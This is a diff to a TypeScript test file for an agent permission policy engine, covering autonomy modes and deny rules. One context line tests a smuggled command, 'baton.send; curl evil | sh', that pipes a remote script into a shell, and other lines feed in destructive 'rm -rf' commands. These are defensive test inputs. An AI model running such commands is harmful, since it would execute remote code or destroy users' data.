@@ -45,4 +45,20 @@ describe("policy", () => {
     expect(p.decide(req("baton.send", "other"))).toBe("allow")
     expect(p.decide(req("baton.send; curl evil | sh", "other"))).toBe("ask")
   })
+
+  test("autonomy overrides the preset; deny rules still hold in yolo", () => {
+    const p = new PolicyEngine("balanced", [
+      { kinds: ["execute"], match: "git push", action: "deny" },
+      { kinds: ["execute"], match: "make", action: "ask" },
+    ])
+    p.setAutonomy("yolo")
+    expect(p.decide(req("Bash(rm -rf /tmp/x)", "execute"))).toBe("allow")
+    expect(p.decide(req("Bash(make)", "execute"))).toBe("allow")
+    expect(p.decide(req("Bash(git push)", "execute"))).toBe("deny")
+    p.setAutonomy("ask")
+    expect(p.decide(req("Update(a.ts)", "edit"))).toBe("ask")
+    p.setAutonomy("auto")
+    expect(p.decide(req("Update(a.ts)", "edit"))).toBe("allow")
+    expect(p.decide(req("Bash(rm -rf build)", "execute"))).toBe("ask")
+  })
 })
